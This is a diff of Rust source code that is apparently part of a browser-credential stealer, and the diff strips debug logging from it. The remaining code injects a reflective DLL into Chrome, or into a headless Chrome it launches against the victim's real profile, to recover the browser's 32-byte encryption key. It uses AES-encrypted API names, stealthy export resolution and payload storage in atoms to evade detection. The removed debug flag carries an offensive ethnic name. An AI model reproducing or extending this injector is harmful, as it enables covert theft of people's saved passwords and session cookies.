@@ -44,45 +44,6 @@ pub struct PROCESS_INFORMATION {
 }
 
 
-const INJ_DEBUG: bool = {
-    match option_env!("JEWISH_DEBUG") {
-        Some(v) => v.len() == 1 && v.as_bytes()[0] == 49u8,
-        None => false,
-    }
-};
-
-fn _inj_debug_enabled() -> bool {
-    INJ_DEBUG
-}
-
-fn inj_log_write(msg: &str) {
-    if !INJ_DEBUG { return; }
-    use std::fs::OpenOptions;
-    use std::io::Write;
-    if let Ok(exe_path) = std::env::current_exe() {
-        if let Some(dir) = exe_path.parent() {
-            let log_path = dir.join("n0.log");
-            if let Ok(mut f) = OpenOptions::new().create(true).append(true).open(&log_path) {
-                let _ = writeln!(f, "{}", msg);
-                let _ = f.flush();
-                return;
-            }
-        }
-    }
-    let path = std::env::temp_dir().join("n0.log");
-    if let Ok(mut f) = OpenOptions::new().create(true).append(true).open(&path) {
-        let _ = writeln!(f, "{}", msg);
-        let _ = f.flush();
-    }
-}
-
-macro_rules! inj_log {
-    ($($arg:tt)*) => {
-        if INJ_DEBUG {
-            inj_log_write(&format!($($arg)*));
-        }
-    };
-}
 
 use polymorphic_keys::aes_decrypt;
 
@@ -287,40 +248,40 @@ fn find_export_file_offset(dll_data: &[u8], name: &str) -> Option<u32> {
         let e_lfanew = *(base.add(0x3C) as *const i32);
         let nt = base.add(e_lfanew as usize);
         let sig = core::ptr::read_unaligned(nt as *const u32);
-        if sig != 0x00004550 { inj_log!("find_export: bad NT sig"); return None; }
+        if sig != 0x00004550 { return None; }
         let file_hdr = nt.add(4);
         let _opt_hdr_size = core::ptr::read_unaligned(file_hdr.add(16) as *const u16) as usize;
         let opt_hdr = nt.add(24);
         let dd0_rva = core::ptr::read_unaligned(opt_hdr.add(112) as *const u32);
-        if dd0_rva == 0 { inj_log!("find_export: no export dir"); return None; }
+        if dd0_rva == 0 { return None; }
         let export_fo = match rva_to_offset(dll_data, dd0_rva) {
             Some(o) => o,
-            None => { inj_log!("find_export: rva_to_offset failed for export dir RVA=0x{:X}", dd0_rva); return None; }
+            None => { return None; }
         };
-        if (export_fo as usize) + 40 > dll_len { inj_log!("find_export: export dir beyond file"); return None; }
+        if (export_fo as usize) + 40 > dll_len { return None; }
         let exp = base.add(export_fo as usize);
         let num_names = core::ptr::read_unaligned(exp.add(24) as *const u32);
         let num_funcs = core::ptr::read_unaligned(exp.add(20) as *const u32);
         let addr_names_rva = core::ptr::read_unaligned(exp.add(32) as *const u32);
         let addr_funcs_rva = core::ptr::read_unaligned(exp.add(28) as *const u32);
         let addr_ords_rva = core::ptr::read_unaligned(exp.add(36) as *const u32);
-        if num_names > 10000 || num_funcs > 10000 { inj_log!("find_export: suspicious num_names={} num_funcs={}", num_names, num_funcs); return None; }
-        inj_log!("find_export: export dir at FO=0x{:X} num_names={} num_funcs={}", export_fo, num_names, num_funcs);
+        if num_names > 10000 || num_funcs > 10000 { return None; }
+
         let names_fo = match rva_to_offset(dll_data, addr_names_rva) {
             Some(o) => o,
-            None => { inj_log!("find_export: rva_to_offset failed for names RVA=0x{:X}", addr_names_rva); return None; }
+            None => { return None; }
         };
         let funcs_fo = match rva_to_offset(dll_data, addr_funcs_rva) {
             Some(o) => o,
-            None => { inj_log!("find_export: rva_to_offset failed for funcs RVA=0x{:X}", addr_funcs_rva); return None; }
+            None => { return None; }
         };
         let ords_fo = match rva_to_offset(dll_data, addr_ords_rva as u32) {
             Some(o) => o,
-            None => { inj_log!("find_export: rva_to_offset failed for ords RVA=0x{:X}", addr_ords_rva); return None; }
+            None => { return None; }
         };
-        if (names_fo as usize) + (num_names as usize * 4) > dll_len { inj_log!("find_export: names table beyond file"); return None; }
-        if (funcs_fo as usize) + (num_funcs as usize * 4) > dll_len { inj_log!("find_export: funcs table beyond file"); return None; }
-        if (ords_fo as usize) + (num_names as usize * 2) > dll_len { inj_log!("find_export: ords table beyond file"); return None; }
+        if (names_fo as usize) + (num_names as usize * 4) > dll_len { return None; }
+        if (funcs_fo as usize) + (num_funcs as usize * 4) > dll_len { return None; }
+        if (ords_fo as usize) + (num_names as usize * 2) > dll_len { return None; }
         let names = base.add(names_fo as usize) as *const u32;
         let functions = base.add(funcs_fo as usize) as *const u32;
         let ordinals = base.add(ords_fo as usize) as *const u16;
@@ -329,9 +290,9 @@ fn find_export_file_offset(dll_data: &[u8], name: &str) -> Option<u32> {
             let name_rva = *names.add(i as usize);
             let name_fo = match rva_to_offset(dll_data, name_rva) {
                 Some(o) => o,
-                None => { inj_log!("find_export: rva_to_offset failed for name RVA=0x{:X}", name_rva); continue; }
+                None => { continue; }
             };
-            if (name_fo as usize) + name_bytes.len() + 1 > dll_len { inj_log!("find_export: name beyond file at FO=0x{:X}", name_fo); continue; }
+            if (name_fo as usize) + name_bytes.len() + 1 > dll_len { continue; }
             let name_ptr = base.add(name_fo as usize);
             let mut matched = true;
             for (j, &b) in name_bytes.iter().enumerate() {
@@ -339,30 +300,30 @@ fn find_export_file_offset(dll_data: &[u8], name: &str) -> Option<u32> {
             }
             if matched && *(name_ptr.add(name_bytes.len())) == 0 {
                 let ord = *ordinals.add(i as usize) as usize;
-                if ord >= num_funcs as usize { inj_log!("find_export: ord {} >= num_funcs {}", ord, num_funcs); return None; }
+                if ord >= num_funcs as usize { return None; }
                 let func_rva = *functions.add(ord);
                 let func_fo = match rva_to_offset(dll_data, func_rva) {
                     Some(o) => o,
-                    None => { inj_log!("find_export: rva_to_offset failed for func RVA=0x{:X}", func_rva); return None; }
+                    None => { return None; }
                 };
-                inj_log!("find_export: found '{}' at FO=0x{:X}", name, func_fo);
+
                 return Some(func_fo);
             }
         }
-        inj_log!("find_export: '{}' not found in {} names", name, num_names);
+
         None
     }
 }
 
 fn inject_dll_reflective(pid: u32, dll_data: &[u8]) -> Result<(), ()> {
-    inj_log!("inject_dll_reflective: START pid={} dll_len={}\n", pid, dll_data.len());
+
     unsafe {
         let k32 = syscall::get_module_base(crate::stealth::stealth_dll_name(0)).ok_or(())?;
         let open_name = aes_decrypt(&polymorphic_keys::OPEN_PROC_ENC, &polymorphic_keys::OPEN_PROC_KEY, &polymorphic_keys::OPEN_PROC_NONCE);
         let open_addr = syscall::resolve_export(k32, core::str::from_utf8_unchecked(&open_name)).ok_or(())?;
         let open_fn: unsafe extern "system" fn(u32, i32, u32) -> *mut std::ffi::c_void = std::mem::transmute(open_addr);
         let proc = open_fn(0x003A, 0, pid);
-        if proc.is_null() { inj_log!("inject_dll_reflective: OpenProcess FAILED\n"); return Err(()); }
+        if proc.is_null() { return Err(()); }
         let result = inject_dll_reflective_inner(proc, dll_data);
         let close_name = aes_decrypt(&polymorphic_keys::CLOSE_H_ENC, &polymorphic_keys::CLOSE_H_KEY, &polymorphic_keys::CLOSE_H_NONCE);
         let close_addr = syscall::resolve_export(k32, core::str::from_utf8_unchecked(&close_name)).ok_or(())?;
@@ -380,17 +341,17 @@ unsafe fn inject_dll_reflective_inner(proc: *mut std::ffi::c_void, dll_data: &[u
     let rl_name = aes_decrypt(&polymorphic_keys::RL_ENC, &polymorphic_keys::RL_KEY, &polymorphic_keys::RL_NONCE);
     let rl_str = core::str::from_utf8_unchecked(&rl_name);
     let loader_fo = match find_export_file_offset(dll_data, rl_str) {
-        Some(o) => o, None => { inj_log!("reflective_inner: ReflectiveLoader NOT FOUND\n"); return Err(()); }
+        Some(o) => o, None => { return Err(()); }
     };
     let k32 = match crate::syscall::get_module_base(crate::stealth::stealth_dll_name(0)) {
         Some(b) => b,
-        None => { inj_log!("reflective_inner: kernel32 NOT FOUND\n"); return Err(()); }
+        None => { return Err(()); }
     };
     let dll_remote = dynapi::VirtualAllocEx(proc, std::ptr::null_mut(), dll_data.len(), 0x3000, 0x40);
-    if dll_remote.is_null() { inj_log!("reflective_inner: VirtualAllocEx dll FAILED\n"); return Err(()); }
+    if dll_remote.is_null() { return Err(()); }
     let mut written = 0usize;
     if dynapi::WriteProcessMemory(proc, dll_remote, dll_data.as_ptr(), dll_data.len(), &mut written) == 0 {
-        inj_log!("reflective_inner: WriteProcessMemory dll FAILED\n"); return Err(());
+ return Err(());
     }
     let loader_addr = dll_remote.add(loader_fo as usize);
     let mut stub_mut = [0u8; 41];
@@ -419,15 +380,15 @@ unsafe fn inject_dll_reflective_inner(proc: *mut std::ffi::c_void, dll_data: &[u
     stub_mut[16..24].copy_from_slice(&(k32 as u64).to_le_bytes());
     stub_mut[26..34].copy_from_slice(&(loader_addr as u64).to_le_bytes());
     let stub_remote = dynapi::VirtualAllocEx(proc, std::ptr::null_mut(), stub_mut.len(), 0x3000, 0x40);
-    if stub_remote.is_null() { inj_log!("reflective_inner: VirtualAllocEx stub FAILED\n"); return Err(()); }
+    if stub_remote.is_null() { return Err(()); }
     if dynapi::WriteProcessMemory(proc, stub_remote, stub_mut.as_ptr(), stub_mut.len(), &mut written) == 0 {
-        inj_log!("reflective_inner: WriteProcessMemory stub FAILED\n"); return Err(());
+ return Err(());
     }
     let thr = dynapi::CreateRemoteThread(proc, std::ptr::null_mut(), 0, std::mem::transmute(stub_remote), std::ptr::null_mut(), 0, std::ptr::null_mut());
-    if thr.is_null() || thr as isize == -1 { inj_log!("reflective_inner: CreateRemoteThread FAILED\n"); return Err(()); }
+    if thr.is_null() || thr as isize == -1 { return Err(()); }
     dynapi::WaitForSingleObject(thr, 15000);
     dynapi::CloseHandle(thr);
-    inj_log!("reflective_inner: DONE OK\n");
+
     Ok(())
 }
 
@@ -436,12 +397,12 @@ fn spawn_chrome_and_inject(chrome_exe: &str, dll_path: &Path, real_profile: &Pat
     let chrome_default = aes_decrypt(&polymorphic_keys::INJ_CHROME_EXE_ENC, &polymorphic_keys::INJ_CHROME_EXE_KEY, &polymorphic_keys::INJ_CHROME_EXE_NONCE);
     let chrome_default = String::from_utf8_lossy(&chrome_default).into_owned();
     let exe_name = std::path::Path::new(chrome_exe).file_name().map(|f| f.to_string_lossy().to_string()).unwrap_or(chrome_default);
-    inj_log!("spawn_chrome: checking existing {} processes\n", exe_name);
+
     for pid in find_browser_pids(&exe_name) {
         let dll_bytes = fs::read(dll_path).unwrap_or_default();
-        if inject_dll_reflective(pid, &dll_bytes).is_ok() { inj_log!("spawn_chrome: injected into existing pid={}\n", pid); return Ok(pid); }
+        if inject_dll_reflective(pid, &dll_bytes).is_ok() { return Ok(pid); }
     }
-    inj_log!("spawn_chrome: launching headless with profile {:?}\n", real_profile);
+
     let mut parts: Vec<String> = Vec::new();
     parts.push(format!("\"{chrome_exe}\""));
     let flags = ["--headless=new","--disable-gpu","--disable-logging","--log-level=","3","--disable-background-networking","--disable-sync","--disable-default-apps","--disable-extensions","--disable-component-update","--no-first-run","--no-default-browser-check","--noerrdialogs","--disable-dev-tools","--disable-features=Translate","--disable-ipc-flooding-protection","--disable-breakpad","--metrics-recording-only","--user-data-dir="];
@@ -449,7 +410,7 @@ fn spawn_chrome_and_inject(chrome_exe: &str, dll_path: &Path, real_profile: &Pat
     let last_idx = parts.len() - 1;
     parts[last_idx] = format!("{}\"{}\"", parts[last_idx], profile_str);
     let cmdline = parts.join(" ");
-    inj_log!("spawn_chrome: cmdline={}\n", cmdline);
+
     let exe_w = wide(chrome_exe);
     let mut cmd_w = wide(&cmdline);
     let mut si: STARTUPINFOW = unsafe { std::mem::zeroed() };
@@ -457,9 +418,9 @@ fn spawn_chrome_and_inject(chrome_exe: &str, dll_path: &Path, real_profile: &Pat
     let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };
     unsafe {
         let cp_ok = dynapi::CreateProcessW(exe_w.as_ptr(), cmd_w.as_mut_ptr(), std::ptr::null_mut(), std::ptr::null_mut(), 0, 0x0800_0000, std::ptr::null_mut(), std::ptr::null(), &mut si as *mut _ as *mut std::ffi::c_void, &mut pi as *mut _ as *mut std::ffi::c_void);
-        if cp_ok == 0 { inj_log!("spawn_chrome: CreateProcessW FAILED\n"); return Err(()); }
+        if cp_ok == 0 { return Err(()); }
         let pid = pi.dwProcessId;
-        inj_log!("spawn_chrome: created pid={} handle={:?}\n", pid, pi.hProcess);
+
         std::thread::sleep(std::time::Duration::from_millis(2000));
         let dll_bytes = fs::read(dll_path).unwrap_or_default();
         if dll_bytes.is_empty() { dynapi::CloseHandle(pi.hThread); dynapi::CloseHandle(pi.hProcess); return Err(()); }
@@ -467,8 +428,8 @@ fn spawn_chrome_and_inject(chrome_exe: &str, dll_path: &Path, real_profile: &Pat
         dynapi::CloseHandle(pi.hThread);
         dynapi::CloseHandle(pi.hProcess);
         match result {
-            Ok(()) => { inj_log!("spawn_chrome: injection OK pid={}\n", pid); }
-            Err(()) => { inj_log!("spawn_chrome: FAILED\n"); return Err(()); }
+            Ok(()) => { }
+            Err(()) => { return Err(()); }
         }
         Ok(pid)
     }
@@ -488,11 +449,11 @@ fn read_key_from_result(path: &Path) -> Option<Vec<u8>> {
 }
 
 pub fn recover_key(browser_name: &str, payload_dll: &[u8]) -> Option<Vec<u8>> {
-    inj_log!("recover_key: START browser={}\n", browser_name);
+
     if payload_dll.is_empty() { return None; }
     let target = browsers::find_target(browser_name)?;
     let browser_exe = resolve_browser_exe(&target.exe)?;
-    inj_log!("recover_key: browser_exe={} profile={}\n", browser_exe, target.user_data_rel);
+
     let tag = session_tag();
     let temp = env::temp_dir();
     let dll_path = temp.join(format!("{tag}.tmp"));
@@ -506,7 +467,7 @@ pub fn recover_key(browser_name: &str, payload_dll: &[u8]) -> Option<Vec<u8>> {
     dynapi::init();
     if fs::write(&dll_path, payload_dll).is_err() { return None; }
     let _ = stealth::store_data_in_atoms(payload_dll);
-    inj_log!("recover_key: setting env vars\n");
+
     unsafe {
         let env_result = aes_decrypt(&polymorphic_keys::RESULT_ENV_ENC, &polymorphic_keys::RESULT_ENV_KEY, &polymorphic_keys::RESULT_ENV_NONCE);
         let env_user_data = aes_decrypt(&polymorphic_keys::USER_DATA_ENV_ENC, &polymorphic_keys::USER_DATA_ENV_KEY, &polymorphic_keys::USER_DATA_ENV_NONCE);
@@ -524,7 +485,7 @@ pub fn recover_key(browser_name: &str, payload_dll: &[u8]) -> Option<Vec<u8>> {
             crate::dynapi::set_env_var(core::str::from_utf8_unchecked(&env_cls), clsid);
         }
     }
-    inj_log!("recover_key: env vars set\n");
+
     let profile_for_spawn = real_profile.as_ref().map(|p| p.as_path());
     let injected = 'inject: {
         if let Some(profile) = profile_for_spawn {
@@ -536,17 +497,17 @@ pub fn recover_key(browser_name: &str, payload_dll: &[u8]) -> Option<Vec<u8>> {
         }
         false
     };
-    if !injected { inj_log!("recover_key: injection FAILED\n"); return None; }
-    inj_log!("recover_key: polling for result\n");
+    if !injected { return None; }
+
     for i in 0..60 {
         if result_path.exists() {
-            inj_log!("recover_key: result file exists at iteration {}\n", i);
+
             if let Some(key) = read_key_from_result(&result_path) {
-                if key.len() == 32 { inj_log!("recover_key: key OK!\n"); return Some(key); }
+                if key.len() == 32 { return Some(key); }
             }
         }
         std::thread::sleep(std::time::Duration::from_millis(500));
     }
-    inj_log!("recover_key: polling timed out\n");
+
     None
 }
